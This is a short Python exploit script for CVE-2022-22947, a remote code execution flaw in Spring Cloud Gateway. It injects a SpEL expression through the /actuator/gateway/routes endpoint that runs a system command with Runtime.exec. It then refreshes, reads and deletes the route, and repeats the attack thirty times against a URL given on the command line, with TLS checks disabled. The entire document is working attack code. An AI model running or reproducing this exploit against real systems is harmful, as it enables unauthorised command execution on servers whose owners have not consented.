import requests
import json
import sys

requests.packages.urllib3.disable_warnings()

def exec(url, keyword):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    ## command to execute replace "id" in payload

    payload = f'''{{\r
      "id": \"{keyword}\",\r
      "filters": [{{\r
        "name": "AddResponseHeader",\r
        "args": {{"name": "Result","value": "#{{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{{\\"id\\"}}).getInputStream()))}}"}}\r
        }}],\r
      "uri": "http://example.com",\r
      "order": 0\r
    }}'''

    re1 = requests.post(url=url + f"/actuator/gateway/routes/{keyword}", data=payload, headers=headers1, json=json, verify=False)
    re2 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2, verify=False)
    re3 = requests.get(url=url + f"/actuator/gateway/routes/{keyword}", headers=headers2, verify=False)
    re4 = requests.delete(url=url + f"/actuator/gateway/routes/{keyword}", headers=headers2, verify=False)
    re5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2, verify=False)
    print("OK")


if __name__ == "__main__":
    print('''   
CVE-2022-22947 Spring Cloud Gateway RCE漏洞
usage: python3 new_CVE-2022-22947-for-test.py url keyword
''')
    if (len(sys.argv) > 2):
        url = sys.argv[1]
        keyword = sys.argv[2]
        i = 0
        while i < 30:
            exec(url, keyword)
            print("第{}次攻击完成".format(i + 1))
            i += 1
    else:
        exit()